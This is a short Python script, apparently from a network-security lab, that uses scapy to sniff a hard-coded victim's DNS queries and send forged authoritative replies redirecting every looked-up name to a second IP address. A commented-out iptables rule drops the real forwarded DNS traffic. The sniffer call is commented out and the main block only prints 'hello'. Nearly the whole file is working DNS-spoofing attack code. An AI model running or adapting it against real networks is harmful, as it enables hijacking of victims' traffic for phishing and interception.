from scapy.all import sniff, srp, IP, DNS, DNSQR, Ether, UDP, DNSRR, sendp
from subprocess import Popen, PIPE

victimIP = "10.5.1.2"
gotoIP = "10.5.1.3"


def sniffDNS(victimIP):
	sniff(filter="udp and port 53 and host " + victimIP, prn = spoofDNS)

def spoofDNS(packet):
    if packet[IP].src != "127.0.0.1":
        if packet[IP].src == victimIP and packet.haslayer(DNS) and DNSQR in packet:
            spoof = ((Ether())/IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=gotoIP)))
            sendp(spoof, count=1)

if __name__ == '__main__':
    #Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"],shell=True, stdout=PIPE)
    #sniffDNS()
    print("hello")

    
